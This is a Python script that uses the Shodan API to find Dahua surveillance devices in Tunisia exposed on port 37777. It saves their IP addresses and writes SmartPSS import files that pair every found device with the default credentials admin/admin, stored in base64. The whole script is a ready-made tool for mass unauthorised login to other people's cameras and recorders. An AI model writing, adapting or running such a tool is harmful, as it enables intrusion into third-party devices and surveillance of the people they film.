import time
import shodan


def main():
    SHODAN_API_KEY = input("Provide a Shodan API key: ")

    shodan_api = shodan.Shodan(SHODAN_API_KEY)
    result = shodan_api.count('country:"TN" port:"37777"')["total"]
    print(f'[+] Possible Number of Public Dahua Devices: {result}')
    pages = result // 100 + 1
    Dahua_IPs = []
    time.sleep(3)
    print('[+] Retrieving IP addresses. This might take some time.')
    for page in range(pages):
        time.sleep(3)
        results = shodan_api.search('country:"TN" port:"37777"', page=page+1)
        for result in results['matches']:
            if result['ip_str'] != '':
                Dahua_IPs.append(result['ip_str'] + '\n')
    print(f'[+] Number of IPs retrieved: {len(Dahua_IPs)}')
    print('[+] Saving found IP addresses to "Shodan_IPs.txt"')
    with open("Shodan_IPs.txt", 'w+') as file:
        file.writelines(Dahua_IPs)
    print('[+] Writing XML files for SmartPSS using default credentials')
    number = len(Dahua_IPs) // 256 + 1
    for i in range(number):
        with open(f"device_{i+1}.xml", "w+") as file:
            file.write('<?xml version="1.0" encoding="UTF-8"?>\n')
            file.write('<DeviceManager version="1.0">\n')
            for ip in range(256):
                if i == number - 1 and ip == len(Dahua_IPs) % 256:
                    break
                file.write(
                    f'<Device name="{Dahua_IPs[256 * i + ip].strip()}" domain="{Dahua_IPs[256 * i + ip].strip()}" \
                        port="37777" username="admin" password="YWRtaW4=" protocol="1" connect="0" />\n')
            file.write('</DeviceManager>\n')
    print('[+] Done')


if __name__ == '__main__':
    main()
